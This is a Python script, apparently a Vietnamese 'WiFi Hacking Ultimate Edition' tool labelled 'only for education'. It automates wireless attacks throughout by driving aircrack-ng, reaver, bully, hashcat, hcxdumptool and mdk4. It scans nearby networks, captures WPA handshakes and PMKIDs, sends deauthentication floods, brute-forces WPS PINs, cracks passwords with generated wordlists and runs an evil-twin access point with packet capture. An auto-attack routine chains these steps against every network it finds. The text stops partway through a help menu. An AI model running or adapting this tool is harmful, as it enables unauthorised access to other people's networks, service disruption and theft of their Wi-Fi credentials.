#!/usr/bin/env python3
# ============================================================================
# ███████╗██████╗  ██████╗  ██████╗ ████████╗ ██████╗ 
# ██╔════╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗
# █████╗  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║
# ██╔══╝  ██╔══██╗██╔══██╗██║   ██║   ██║   ██║   ██║
# ███████╗██║  ██║██║  ██║╚██████╔╝   ██║   ╚██████╔╝
# ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ 
# ============================================================================
#                    WIFI HACKING ULTIMATE EDITION v9.0
#                         MADE BY EROOTG
#                    ONLY FOR EDUCATION PURPOSES
# ============================================================================

import os
import sys
import time
import subprocess
import threading
import re
import signal
import socket
import struct
import random
import json
import shutil
import platform
import ctypes
import queue
from datetime import datetime
from collections import defaultdict

# ==================== CHỈ DÙNG MÀU TRẮNG ====================
W = '\033[97m'
N = '\033[0m'
BOLD = '\033[1m'

# ==================== LOGO EROOTG ASCII ====================
def show_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo = f"""
{W}{BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███████╗██████╗  ██████╗  ██████╗ ████████╗ ██████╗                    ║
║   ██╔════╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗                   ║
║   █████╗  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║                   ║
║   ██╔══╝  ██╔══██╗██╔══██╗██║   ██║   ██║   ██║   ██║                   ║
║   ███████╗██║  ██║██║  ██║╚██████╔╝   ██║   ╚██████╔╝                   ║
║   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝                    ║
║                                                                           ║
║   ██╗    ██╗██╗███████╗██╗                                                 ║
║   ██║    ██║██║██╔════╝██║                                                 ║
║   ██║ █╗ ██║██║█████╗  ██║                                                 ║
║   ██║███╗██║██║██╔══╝  ██║                                                 ║
║   ╚███╔███╔╝██║██║     ██║                                                 ║
║    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                                 ║
║                                                                           ║
║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗                 ║
║   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝                 ║
║   ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║                      ║
║   ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║                      ║
║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╗                 ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                 ║
║                                                                           ║
║   ████████╗ ██████╗  ██████╗ ██╗                                         ║
║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║                                         ║
║      ██║   ██║   ██║██║   ██║██║                                         ║
║      ██║   ██║   ██║██║   ██║██║                                         ║
║      ██║   ╚██████╔╝╚██████╔╝███████╗                                    ║
║      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                                    ║
║                                                                           ║
║                    ULTIMATE EDITION v9.0                                  ║
║                    FULLY DEVELOPED - ALL FEATURES                         ║
║                    ONLY FOR EDUCATION                                    ║
╚═══════════════════════════════════════════════════════════════════════════╝
{N}"""
    print(logo)

# ==================== KIỂM TRA HỆ THỐNG ====================

def check_root():
    """Kiểm tra quyền root/admin"""
    try:
        if os.name == 'nt':
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except:
        return False

def check_dependencies():
    """Kiểm tra các công cụ cần thiết"""
    deps = {
        'aircrack-ng': 'Aircrack-ng suite',
        'airodump-ng': 'Packet capture',
        'aireplay-ng': 'Packet injection',
        'hashcat': 'GPU Cracker',
        'hcxdumptool': 'PMKID capture',
        'hcxpcapngtool': 'PMKID convert',
        'reaver': 'WPS attack',
        'bully': 'WPS attack',
        'mdk4': 'Advanced deauth',
        'tcpdump': 'Packet capture',
        'hostapd': 'Access point',
        'dnsmasq': 'DHCP server',
        'iwconfig': 'Wireless config',
        'ifconfig': 'Network config'
    }
    
    missing = []
    for cmd, desc in deps.items():
        if not shutil.which(cmd):
            missing.append(f"{cmd} ({desc})")
    
    return missing

def get_wifi_interfaces():
    """Lấy danh sách interface WiFi"""
    interfaces = []
    try:
        if os.name == 'nt':
            result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
                                   capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'Name' in line and ':' in line:
                    iface = line.split(':')[1].strip()
                    interfaces.append(iface)
        else:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
    except:
        pass
    return interfaces

# ==================== CORE WIFI ENGINE ====================

class WiFiHacker:
    def __init__(self):
        self.interfaces = get_wifi_interfaces()
        self.monitor_iface = None
        self.targets = []
        self.cracked = []
        self.handshakes = []
        self.pmkids = []
        self.stats = {
            'packets_captured': 0,
            'handshakes': 0,
            'pmkids': 0,
            'wps_pins': 0,
            'cracked': 0,
            'deauthed': 0
        }
    
    # ==================== MONITOR MODE ====================
    
    def enable_monitor(self, interface):
        """Bật monitor mode"""
        print(f"{W}[*] Đang bật monitor mode trên {interface}...{N}")
        
        methods = [
            f"airmon-ng start {interface}",
            f"iw dev {interface} set type monitor",
            f"ip link set {interface} down && iw dev {interface} set type monitor && ip link set {interface} up"
        ]
        
        for method in methods:
            try:
                subprocess.run(method.split(), capture_output=True, timeout=5)
                time.sleep(2)
                
                # Tìm interface monitor mới
                result = subprocess.run(['iwconfig'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Mode:Monitor' in line or 'Monitor' in line:
                        iface = line.split()[0]
                        self.monitor_iface = iface
                        print(f"{W}[✓] Monitor mode bật: {iface}{N}")
                        return iface
            except:
                continue
        
        # Thử với suffix 'mon'
        mon_iface = interface + 'mon'
        try:
            subprocess.run(['airmon-ng', 'start', interface], capture_output=True)
            time.sleep(2)
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            if mon_iface in result.stdout:
                self.monitor_iface = mon_iface
                print(f"{W}[✓] Monitor mode bật: {mon_iface}{N}")
                return mon_iface
        except:
            pass
        
        print(f"{W}[✗] Không thể bật monitor mode{N}")
        return None
    
    def disable_monitor(self):
        """Tắt monitor mode"""
        if self.monitor_iface:
            try:
                subprocess.run(['airmon-ng', 'stop', self.monitor_iface], capture_output=True)
                print(f"{W}[✓] Monitor mode tắt{N}")
            except:
                pass
            self.monitor_iface = None
    
    # ==================== SCANNING ====================
    
    def scan_networks(self, duration=15):
        """Quét mạng WiFi"""
        if not self.monitor_iface:
            print(f"{W}[✗] Chưa bật monitor mode{N}")
            return []
        
        print(f"{W}[*] Đang quét mạng trong {duration} giây...{N}")
        print(f"{W}[*] Nhấn Ctrl+C để dừng sớm{N}")
        
        networks = []
        output_file = f"/tmp/scan_{int(time.time())}"
        
        try:
            # Chạy airodump-ng
            process = subprocess.Popen([
                'airodump-ng', self.monitor_iface,
                '-w', output_file,
                '--output-format', 'csv',
                '--write-interval', '1'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Đếm ngược
            for i in range(duration):
                time.sleep(1)
                print(f"{W}   Đang quét... {i+1}/{duration}s\r{N}", end='')
            
            process.terminate()
            time.sleep(1)
            
            # Đọc kết quả
            csv_file = output_file + '-01.csv'
            if os.path.exists(csv_file):
                with open(csv_file, 'r', errors='ignore') as f:
                    lines = f.readlines()
                
                in_ap = False
                for line in lines:
                    if 'BSSID' in line and 'First time seen' in line:
                        in_ap = True
                        continue
                    if 'Station MAC' in line:
                        break
                    
                    if in_ap and line.strip() and ',' in line:
                        parts = line.split(',')
                        if len(parts) > 13:
                            bssid = parts[0].strip()
                            if len(bssid) == 17 and ':' in bssid:
                                channel = parts[3].strip()
                                enc = parts[5].strip()
                                power = parts[8].strip()
                                essid = parts[13].strip() if len(parts) > 13 else 'Hidden'
                                
                                if 'WPA3' in enc:
                                    enc_type = 'WPA3'
                                elif 'WPA2' in enc:
                                    enc_type = 'WPA2'
                                elif 'WPA' in enc:
                                    enc_type = 'WPA'
                                elif 'WEP' in enc:
                                    enc_type = 'WEP'
                                else:
                                    enc_type = 'OPEN'
                                
                                networks.append({
                                    'bssid': bssid.upper(),
                                    'essid': essid if essid else 'Hidden',
                                    'channel': channel,
                                    'signal': power,
                                    'encryption': enc_type,
                                    'clients': []
                                })
                
                os.remove(csv_file)
            
            print(f"\n{W}[✓] Tìm thấy {len(networks)} mạng{N}")
            self.targets = networks
            return networks
            
        except KeyboardInterrupt:
            process.terminate()
            print(f"\n{W}[!] Dừng quét{N}")
            return networks
        except Exception as e:
            print(f"\n{W}[✗] Lỗi quét: {e}{N}")
            return []
    
    def scan_clients(self, bssid, channel, duration=15):
        """Quét client của một AP"""
        if not self.monitor_iface:
            return []
        
        print(f"{W}[*] Đang quét client cho {bssid} trên kênh {channel}...{N}")
        
        # Set channel
        subprocess.run(['iwconfig', self.monitor_iface, 'channel', channel], capture_output=True)
        
        clients = []
        output_file = f"/tmp/clients_{int(time.time())}"
        
        try:
            process = subprocess.Popen([
                'airodump-ng', self.monitor_iface,
                '--bssid', bssid,
                '-c', str(channel),
                '-w', output_file,
                '--output-format', 'csv'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            for i in range(duration):
                time.sleep(1)
                print(f"{W}   Đang quét... {i+1}/{duration}s\r{N}", end='')
            
            process.terminate()
            time.sleep(1)
            
            csv_file = output_file + '-01.csv'
            if os.path.exists(csv_file):
                with open(csv_file, 'r', errors='ignore') as f:
                    lines = f.readlines()
                
                in_client = False
                for line in lines:
                    if 'Station MAC' in line:
                        in_client = True
                        continue
                    
                    if in_client and line.strip() and ',' in line:
                        parts = line.split(',')
                        if len(parts) > 5:
                            client_mac = parts[0].strip()
                            if len(client_mac) == 17 and ':' in client_mac:
                                clients.append({'mac': client_mac})
                
                os.remove(csv_file)
            
            print(f"\n{W}[✓] Tìm thấy {len(clients)} client{N}")
            return clients
            
        except Exception as e:
            print(f"\n{W}[✗] Lỗi quét client: {e}{N}")
            return []
    
    # ==================== CAPTURE ====================
    
    def capture_handshake(self, bssid, channel, essid=None, timeout=60):
        """Bắt handshake WPA/WPA2"""
        if not self.monitor_iface:
            return None
        
        print(f"{W}[*] Đang bắt handshake cho {essid or bssid}...{N}")
        print(f"{W}[*] Kênh: {channel} | Thời gian: {timeout}s{N}")
        
        # Set channel
        subprocess.run(['iwconfig', self.monitor_iface, 'channel', channel], capture_output=True)
        
        output_file = f"/tmp/handshake_{bssid.replace(':', '')}_{int(time.time())}"
        
        try:
            process = subprocess.Popen([
                'airodump-ng', self.monitor_iface,
                '--bssid', bssid,
                '-c', str(channel),
                '-w', output_file,
                '--output-format', 'pcap'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Deauth vài lần để ép client reconnect
            for i in range(3):
                self.deauth_attack(bssid, None, 2, channel)
                time.sleep(2)
            
            for i in range(timeout):
                time.sleep(1)
                print(f"{W}   Đang bắt... {i+1}/{timeout}s | Gói tin: {self.stats['packets_captured']}\r{N}", end='')
            
            process.terminate()
            time.sleep(1)
            
            pcap_file = output_file + '-01.cap'
            if os.path.exists(pcap_file):
                # Kiểm tra handshake
                result = subprocess.run(['aircrack-ng', pcap_file], 
                                      capture_output=True, text=True)
                
                if '1 handshake' in result.stdout or 'WPA handshake' in result.stdout:
                    print(f"\n{W}[✓] Bắt được handshake!{N}")
                    self.stats['handshakes'] += 1
                    
                    # Convert to hashcat format
                    hccapx_file = pcap_file + '.hccapx'
                    subprocess.run(['cap2hccapx', pcap_file, hccapx_file], 
                                 capture_output=True)
                    
                    handshake = {
                        'bssid': bssid,
                        'essid': essid,
                        'channel': channel,
                        'cap_file': pcap_file,
                        'hccapx_file': hccapx_file if os.path.exists(hccapx_file) else None,
                        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    self.handshakes.append(handshake)
                    return handshake
                else:
                    print(f"\n{W}[!] Không tìm thấy handshake{N}")
                    os.remove(pcap_file)
            else:
                print(f"\n{W}[!] Không tạo được file capture{N}")
            
            return None
            
        except KeyboardInterrupt:
            process.terminate()
            print(f"\n{W}[!] Dừng bắt{N}")
            return None
    
    def capture_pmkid(self, timeout=60):
        """Bắt PMKID (WPA3/WPA2 không cần client)"""
        if not self.monitor_iface:
            return []
        
        print(f"{W}[*] Đang bắt PMKID... (không cần client){N}")
        print(f"{W}[*] Thời gian: {timeout}s{N}")
        
        output_file = f"/tmp/pmkid_{int(time.time())}"
        
        try:
            process = subprocess.Popen([
                'hcxdumptool', '-o', output_file + '.pcapng',
                '-i', self.monitor_iface,
                '--enable_status=1'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            for i in range(timeout):
                time.sleep(1)
                print(f"{W}   Đang bắt PMKID... {i+1}/{timeout}s\r{N}", end='')
            
            process.terminate()
            time.sleep(2)
            
            if os.path.exists(output_file + '.pcapng'):
                subprocess.run([
                    'hcxpcapngtool', '-o', output_file + '.22000',
                    output_file + '.pcapng'
                ], capture_output=True)
                
                hash_file = output_file + '.22000'
                if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                    with open(hash_file, 'r') as f:
                        pmkids = f.readlines()
                    
                    print(f"\n{W}[✓] Bắt được {len(pmkids)} PMKID{N}")
                    self.stats['pmkids'] += len(pmkids)
                    
                    pmkid_info = {
                        'file': hash_file,
                        'count': len(pmkids),
                        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                    self.pmkids.append(pmkid_info)
                    return pmkids
                else:
                    print(f"\n{W}[!] Không có PMKID nào{N}")
            else:
                print(f"\n{W}[!] Không tạo được file capture{N}")
            
            return []
            
        except KeyboardInterrupt:
            process.terminate()
            print(f"\n{W}[!] Dừng bắt PMKID{N}")
            return []
    
    # ==================== ATTACKS ====================
    
    def deauth_attack(self, bssid, client=None, count=5, channel=None):
        """Tấn công deauth - ngắt kết nối"""
        if not self.monitor_iface:
            return False
        
        if channel:
            subprocess.run(['iwconfig', self.monitor_iface, 'channel', channel], capture_output=True)
        
        target = f"{bssid}" + (f" (client: {client})" if client else "")
        print(f"{W}[*] Tấn công deauth vào {target}...{N}")
        
        cmd = ['aireplay-ng', '-0', str(count), '-a', bssid]
        if client:
            cmd.extend(['-c', client])
        cmd.append(self.monitor_iface)
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                self.stats['deauthed'] += count
                print(f"{W}[✓] Đã gửi {count} gói deauth{N}")
                return True
            else:
                print(f"{W}[✗] Deauth thất bại{N}")
                return False
        except Exception as e:
            print(f"{W}[✗] Lỗi deauth: {e}{N}")
            return False
    
    def wps_attack(self, bssid, channel, pin=None):
        """Tấn công WPS"""
        if not self.monitor_iface:
            return None
        
        print(f"{W}[*] Tấn công WPS vào {bssid}{N}")
        
        # Set channel
        subprocess.run(['iwconfig', self.monitor_iface, 'channel', channel], capture_output=True)
        
        # Thử bully trước
        if shutil.which('bully'):
            cmd = ['bully', '-b', bssid, '-c', str(channel), '-v', '2', self.monitor_iface]
            if pin:
                cmd.extend(['-p', pin])
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                output = result.stdout + result.stderr
                
                if 'PIN' in output and 'found' in output:
                    pin_match = re.search(r'PIN\s*[:\-]\s*(\d+)', output)
                    if pin_match:
                        found_pin = pin_match.group(1)
                        print(f"{W}[✓] Tìm thấy WPS PIN: {found_pin}{N}")
                        self.stats['wps_pins'] += 1
                        
                        # Lấy password
                        pwd_cmd = ['bully', '-b', bssid, '-c', str(channel), 
                                  '-p', found_pin, '-v', '1', self.monitor_iface]
                        pwd_result = subprocess.run(pwd_cmd, capture_output=True, text=True, timeout=60)
                        
                        pwd_match = re.search(r'KEY\s*[:\-]\s*(\S+)', pwd_result.stdout + pwd_result.stderr)
                        if pwd_match:
                            return {
                                'bssid': bssid,
                                'pin': found_pin,
                                'password': pwd_match.group(1)
                            }
                        return {'bssid': bssid, 'pin': found_pin}
            except:
                pass
        
        # Thử reaver
        if shutil.which('reaver'):
            cmd = ['reaver', '-i', self.monitor_iface, '-b', bssid, '-c', str(channel), '-vv']
            if pin:
                cmd.extend(['-p', pin])
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                output = result.stdout + result.stderr
                
                if 'WPS PIN' in output:
                    pin_match = re.search(r'WPS PIN:\s*\'(\d+)\'', output)
                    if pin_match:
                        found_pin = pin_match.group(1)
                        print(f"{W}[✓] Tìm thấy WPS PIN: {found_pin}{N}")
                        self.stats['wps_pins'] += 1
                        
                        if 'WPA KEY' in output:
                            pwd_match = re.search(r'WPA KEY:\s*\'(.+)\'', output)
                            if pwd_match:
                                return {
                                    'bssid': bssid,
                                    'pin': found_pin,
                                    'password': pwd_match.group(1)
                                }
                        return {'bssid': bssid, 'pin': found_pin}
            except:
                pass
        
        return None
    
    def pixie_dust(self, bssid, channel):
        """Tấn công Pixie Dust"""
        if not self.monitor_iface or not shutil.which('reaver'):
            return None
        
        print(f"{W}[*] Tấn công Pixie Dust vào {bssid}{N}")
        
        cmd = ['reaver', '-i', self.monitor_iface, '-b', bssid, '-c', str(channel),
              '-K', '1', '-N', '-L', '-f', '-v']
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            output = result.stdout + result.stderr
            
            if 'WPS PIN' in output:
                pin_match = re.search(r'WPS PIN:\s*\'(\d+)\'', output)
                if pin_match:
                    found_pin = pin_match.group(1)
                    
                    if 'WPA KEY' in output:
                        pwd_match = re.search(r'WPA KEY:\s*\'(.+)\'', output)
                        if pwd_match:
                            print(f"{W}[✓] Pixie Dust thành công!{N}")
                            self.stats['wps_pins'] += 1
                            return {
                                'bssid': bssid,
                                'pin': found_pin,
                                'password': pwd_match.group(1)
                            }
        except:
            pass
        
        return None
    
    # ==================== CRACKING ====================
    
    def crack_with_wordlist(self, hash_file, wordlist, mode='handshake'):
        """Crack với wordlist"""
        print(f"{W}[*] Đang crack với wordlist: {wordlist}{N}")
        
        if not os.path.exists(wordlist):
            print(f"{W}[✗] Không tìm thấy wordlist{N}")
            return None
        
        if mode == 'handshake' and hash_file.endswith('.cap'):
            cmd = ['aircrack-ng', '-w', wordlist, '-l', '/tmp/cracked.txt', hash_file]
        elif mode == 'pmkid' and hash_file.endswith('.22000'):
            cmd = ['hashcat', '-m', '22000', '-a', '0', hash_file, wordlist, '--show']
        else:
            return None
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if 'KEY FOUND' in result.stdout:
                pwd_match = re.search(r'KEY FOUND! \[ (.*) \]', result.stdout)
                if pwd_match:
                    password = pwd_match.group(1)
                    print(f"{W}[✓] Tìm thấy mật khẩu: {password}{N}")
                    self.stats['cracked'] += 1
                    return password
            
            if os.path.exists('/tmp/cracked.txt'):
                with open('/tmp/cracked.txt', 'r') as f:
                    password = f.read().strip()
                    if password:
                        print(f"{W}[✓] Tìm thấy mật khẩu: {password}{N}")
                        self.stats['cracked'] += 1
                        return password
            
            print(f"{W}[!] Không tìm thấy trong wordlist{N}")
            return None
            
        except Exception as e:
            print(f"{W}[✗] Lỗi crack: {e}{N}")
            return None
    
    def crack_with_hashcat(self, hash_file, wordlist):
        """Crack với hashcat (GPU)"""
        print(f"{W}[*] Đang crack với hashcat (GPU)...{N}")
        
        if not os.path.exists(wordlist):
            print(f"{W}[✗] Không tìm thấy wordlist{N}")
            return None
        
        # Xác định mode
        if hash_file.endswith('.22000'):
            mode = '22000'
        elif hash_file.endswith('.hccapx'):
            mode = '2500'
        else:
            return None
        
        cmd = ['hashcat', '-m', mode, '-a', '0', '-w', '3', '-O', hash_file, wordlist]
        
        try:
            subprocess.run(cmd, capture_output=True, timeout=300)
            
            show_cmd = ['hashcat', '-m', mode, hash_file, '--show']
            result = subprocess.run(show_cmd, capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if ':' in line and len(line.split(':')) > 1:
                    password = line.split(':')[-1].strip()
                    if password:
                        print(f"{W}[✓] Tìm thấy mật khẩu: {password}{N}")
                        self.stats['cracked'] += 1
                        return password
            
            return None
            
        except Exception as e:
            print(f"{W}[✗] Lỗi hashcat: {e}{N}")
            return None
    
    def generate_wordlist(self, essid, bssid, output_file=None):
        """Tạo wordlist thông minh"""
        print(f"{W}[*] Đang tạo wordlist cho {essid}...{N}")
        
        words = set()
        
        # Common passwords
        common = [
            '12345678', 'password', '123456789', '12345', '1234567890',
            'qwerty123', 'qwertyuiop', '11111111', 'admin123', 'passw0rd',
            'wifi123', 'internet', 'wireless', 'password123', '12341234',
            'welcome123', 'guest123', 'default', 'admin', 'root',
            'changeme', 'test123', 'test1234', '123456', '1234567'
        ]
        words.update(common)
        
        # Based on ESSID
        if essid and essid != 'Hidden':
            base = essid.lower()
            words.add(base)
            words.add(base + '123')
            words.add(base + '1234')
            words.add(base + '12345')
            words.add(base + '123456')
            words.add(base + '@123')
            words.add(base + 'wifi')
            words.add(base + 'pass')
            words.add(base + 'password')
            words.add('123' + base)
            words.add(base + '2024')
            words.add(base + '2025')
            words.add(base + '2026')
            words.add(base + 'home')
            words.add(base + 'router')
        
        # Based on BSSID
        if bssid:
            bssid_clean = bssid.replace(':', '').lower()
            last6 = bssid_clean[-6:]
            last4 = bssid_clean[-4:]
            
            words.add(last6)
            words.add(''.join(reversed(last6)))
            words.add(last6 + last6)
            words.add(last6 + '123')
            words.add('123' + last6)
            words.add(last4)
            words.add(last4 + '123')
        
        # Years
        for year in range(2000, 2030):
            words.add(str(year))
            words.add('@' + str(year))
            words.add('#' + str(year))
            words.add('!' + str(year))
        
        # Save file
        if output_file:
            with open(output_file, 'w') as f:
                for word in sorted(words):
                    f.write(word + '\n')
            print(f"{W}[✓] Đã tạo {len(words)} từ, lưu tại {output_file}{N}")
            return output_file
        
        return list(words)
    
    # ==================== ADVANCED ATTACKS ====================
    
    def evil_twin(self, essid, channel, capture_file=None):
        """Tạo Evil Twin AP"""
        if not self.monitor_iface:
            return False
        
        print(f"{W}[*] Tạo Evil Twin AP: {essid}{N}")
        
        # Stop network manager
        if os.name != 'nt':
            subprocess.run(['systemctl', 'stop', 'NetworkManager'], capture_output=True)
        
        # hostapd config
        hostapd_conf = f"""
interface={self.monitor_iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
        hostapd_file = '/tmp/hostapd.conf'
        with open(hostapd_file, 'w') as f:
            f.write(hostapd_conf)
        
        # dnsmasq config
        dnsmasq_conf = f"""
interface={self.monitor_iface}
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
"""
        dnsmasq_file = '/tmp/dnsmasq.conf'
        with open(dnsmasq_file, 'w') as f:
            f.write(dnsmasq_conf)
        
        # Set IP
        subprocess.run(['ifconfig', self.monitor_iface, '192.168.1.1', 'netmask', '255.255.255.0'], 
                      capture_output=True)
        
        # Start services
        hostapd_proc = subprocess.Popen(['hostapd', hostapd_file], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', dnsmasq_file, '-d'], 
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Capture if requested
        tcpdump_proc = None
        if capture_file:
            tcpdump_proc = subprocess.Popen([
                'tcpdump', '-i', self.monitor_iface, '-w', capture_file
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"{W}[✓] Evil Twin đang chạy trên {essid}{N}")
        print(f"{W}[*] Nhấn Ctrl+C để dừng{N}")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{W}[*] Đang dừng Evil Twin...{N}")
            hostapd_proc.terminate()
            dnsmasq_proc.terminate()
            if tcpdump_proc:
                tcpdump_proc.terminate()
            
            if os.name != 'nt':
                subprocess.run(['systemctl', 'start', 'NetworkManager'], capture_output=True)
            
            print(f"{W}[✓] Đã dừng{N}")
        
        return True
    
    def mdk4_attack(self, bssid, mode='d'):
        """Tấn công mdk4"""
        if not self.monitor_iface or not shutil.which('mdk4'):
            print(f"{W}[!] mdk4 không có{N}")
            return False
        
        print(f"{W}[*] Tấn công mdk4 vào {bssid}{N}")
        
        cmd = ['mdk4', self.monitor_iface, mode, '-b', bssid]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(10)
            process.terminate()
            print(f"{W}[✓] Hoàn thành{N}")
            return True
        except Exception as e:
            print(f"{W}[✗] Lỗi: {e}{N}")
            return False
    
    # ==================== AUTO ATTACK ====================
    
    def auto_attack(self, bssid=None):
        """Tự động tấn công"""
        print(f"{W}[*] Bắt đầu tự động tấn công...{N}")
        
        # Scan if no targets
        if not self.targets:
            self.scan_networks(10)
        
        targets = self.targets
        if bssid:
            targets = [t for t in targets if t['bssid'] == bssid]
        
        if not targets:
            print(f"{W}[✗] Không tìm thấy mục tiêu{N}")
            return
        
        for target in targets:
            print(f"\n{W}─── MỤC TIÊU: {target['essid']} ───{N}")
            
            # 1. Try PMKID first
            print(f"{W}[1/4] Thử bắt PMKID...{N}")
            pmkids = self.capture_pmkid(30)
            if pmkids:
                print(f"{W}[✓] Đã bắt PMKID, đang crack...{N}")
                rockyou = '/usr/share/wordlists/rockyou.txt'
                if os.path.exists(rockyou):
                    pwd = self.crack_with_hashcat(self.pmkids[-1]['file'], rockyou)
                    if pwd:
                        self.cracked.append({
                            'essid': target['essid'],
                            'bssid': target['bssid'],
                            'password': pwd,
                            'method': 'PMKID'
                        })
                        continue
            
            # 2. Try handshake
            print(f"{W}[2/4] Thử bắt handshake...{N}")
            handshake = self.capture_handshake(target['bssid'], target['channel'], target['essid'], 45)
            if handshake:
                print(f"{W}[✓] Đã bắt handshake, đang crack...{N}")
                rockyou = '/usr/share/wordlists/rockyou.txt'
                if os.path.exists(rockyou):
                    pwd = self.crack_with_wordlist(handshake['cap_file'], rockyou)
                    if pwd:
                        self.cracked.append({
                            'essid': target['essid'],
                            'bssid': target['bssid'],
                            'password': pwd,
                            'method': 'handshake'
                        })
                        continue
                
                wl = self.generate_wordlist(target['essid'], target['bssid'], '/tmp/wl.txt')
                pwd = self.crack_with_wordlist(handshake['cap_file'], wl)
                if pwd:
                    self.cracked.append({
                        'essid': target['essid'],
                        'bssid': target['bssid'],
                        'password': pwd,
                        'method': 'handshake+smart'
                    })
                    continue
            
            # 3. Try Pixie Dust
            print(f"{W}[3/4] Thử Pixie Dust...{N}")
            result = self.pixie_dust(target['bssid'], target['channel'])
            if result and result.get('password'):
                self.cracked.append({
                    'essid': target['essid'],
                    'bssid': target['bssid'],
                    'password': result['password'],
                    'method': 'pixie'
                })
                continue
            
            # 4. Try deauth + recapture
            print(f"{W}[4/4] Thử deauth + bắt lại...{N}")
            self.deauth_attack(target['bssid'], count=10, channel=target['channel'])
            handshake = self.capture_handshake(target['bssid'], target['channel'], target['essid'], 30)
            if handshake:
                wl = self.generate_wordlist(target['essid'], target['bssid'], '/tmp/wl2.txt')
                pwd = self.crack_with_wordlist(handshake['cap_file'], wl)
                if pwd:
                    self.cracked.append({
                        'essid': target['essid'],
                        'bssid': target['bssid'],
                        'password': pwd,
                        'method': 'deauth+handshake'
                    })
                    continue
            
            print(f"{W}[✗] Không crack được {target['essid']}{N}")
    
    def show_results(self):
        """Hiển thị kết quả"""
        if not self.cracked:
            print(f"{W}[!] Chưa có mạng nào được crack{N}")
            return
        
        print(f"\n{W}{BOLD}─── KẾT QUẢ CRACK ───{N}")
        for i, crack in enumerate(self.cracked, 1):
            print(f"{i}. {crack['essid']} - {crack['password']} ({crack['method']})")
        
        # Save to file
        filename = f"cracked_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            for crack in self.cracked:
                f.write(f"{crack['essid']}|{crack['bssid']}|{crack['password']}|{crack['method']}\n")
        print(f"\n{W}[✓] Đã lưu vào {filename}{N}")
        
        # Stats
        print(f"\n{W}─── THỐNG KÊ ───{N}")
        print(f"Gói tin: {self.stats['packets_captured']}")
        print(f"Handshake: {self.stats['handshakes']}")
        print(f"PMKID: {self.stats['pmkids']}")
        print(f"WPS PIN: {self.stats['wps_pins']}")
        print(f"Đã crack: {self.stats['cracked']}")
        print(f"Deauth: {self.stats['deauthed']}")

# ==================== MAIN MENU ====================

def print_help():
    """In hướng dẫn"""
    help_text = f"""
{W}{BOLD}╔════════════════════════════════════════════════════════════════╗
║                    HƯỚNG DẪN SỬ DỤNG                        ║
╠════════════════════════════════════════════════════════════════╣
║  Tool WiFi Hacking Ultimate - EROOTG Edition                  ║
║                                                                ║
║  CÁC CHỨC NĂNG CHÍNH:                                          ║
║  [01] SCAN MẠNG       - Quét các mạng WiFi xung quanh        ║
║  [02] BẮT HANDSHAKE   - Bắt handshake WPA/WPA2                ║
║  [03] BẮT PMKID       - Bắt PMKID (WPA3/WPA2)                 ║
║  [04] DEAUTH ATTACK   - Ngắt kết nối client                   ║
║  [05] WPS ATTACK      - Tấn công WPS                          ║
║  [06] PIXIE DUST      - Tấn công lỗ hổng WPS                  ║
║  [07] CRACK WORDLIST  - Brute force với wordlist              ║
